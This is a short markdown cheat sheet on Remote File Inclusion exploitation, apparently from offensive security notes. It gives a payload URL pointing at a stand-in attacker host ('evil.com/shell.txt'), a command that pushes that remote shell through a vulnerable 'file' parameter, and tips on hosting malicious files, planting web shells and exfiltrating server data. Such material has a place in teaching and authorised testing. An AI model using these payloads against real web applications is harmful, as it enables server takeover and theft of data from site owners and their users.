# üåê RFI (Remote File Inclusion) Exploitation

## Overview
RFI exploitation involves leveraging vulnerabilities to include remote files through the web browser.

## Example Payloads
1. Basic RFI payload:
    ```bash
    http://evil.com/shell.txt
    ```

## Interactive Example
1. Host a malicious file on an external server.
2. Include the remote file through the vulnerable parameter in a web application.

## Tools
- **RIPS** for automated RFI testing:
    ```bash
    rips -u "http://example.com/vulnerable.php?file=http://evil.com/shell.txt"
    ```

## Tips
- Test in URL parameters, form fields, cookies.
- Verify remote file inclusion in responses.
- Use web shells to gain further access.

## Real-World Scenarios
- Executing remote scripts to control the server.
- Exfiltrating sensitive data from the server.
